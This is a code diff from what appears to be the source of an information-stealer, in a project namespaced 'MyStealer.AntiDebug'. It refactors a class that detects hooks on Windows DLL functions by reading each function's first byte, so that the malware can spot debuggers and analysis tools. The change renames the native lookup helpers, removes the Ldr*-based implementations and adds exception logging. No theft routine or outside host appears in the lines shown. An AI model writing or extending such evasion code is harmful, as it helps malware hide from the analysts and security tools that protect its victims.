@@ -1,12 +1,12 @@
 ﻿using System;
 using System.Runtime.InteropServices;
-using static MyStealer.AntiDebug.Win32Calls;
+using static MyStealer.AntiDebug.NativeCalls;
 
 namespace MyStealer.AntiDebug.Check.AntiAntiAntiDebug
 {
     internal abstract class HookCheckBase : CheckBase
     {
-        protected abstract string ModuleName { get; }
+        protected abstract string DllName { get; }
 
         protected abstract string[] ProcNames { get; }
 
@@ -14,12 +14,12 @@ namespace MyStealer.AntiDebug.Check.AntiAntiAntiDebug
 
         public override bool CheckPassive()
         {
-            var handle = LowLevelGetModuleHandle(ModuleName);
             try
             {
+                var handle = MyGetModuleHandle(DllName);
                 foreach (var proc in ProcNames)
                 {
-                    var procAddr = LowLevelGetProcAddress(handle, proc);
+                    var procAddr = MyGetProcAddress(handle, proc);
                     var ops = new byte[1];
                     Marshal.Copy(procAddr, ops, 0, 1);
 
@@ -30,28 +30,12 @@ namespace MyStealer.AntiDebug.Check.AntiAntiAntiDebug
                     }
                 }
             }
-            catch
+            catch (Exception ex)
             {
-                // ignored
+                Logger.Information(ex, "Failed to check procedure hooking for dll: {dllName}", DllName);
             }
 
             return false;
-        }
-
-        private static IntPtr LowLevelGetModuleHandle(string Library)
-        {
-            var hModule = IntPtr.Zero;
-            RtlInitUnicodeString(out var str, Library);
-            LdrGetDllHandle(null, null, str, ref hModule);
-            return hModule;
-        }
-
-        private static IntPtr LowLevelGetProcAddress(IntPtr hModule, string Function)
-        {
-            RtlInitUnicodeString(out var ustr, Function);
-            RtlUnicodeStringToAnsiString(out var astr, ustr, true);
-            LdrGetProcedureAddress(hModule, astr, 0, out var handle);
-            return handle;
         }
     }
 }
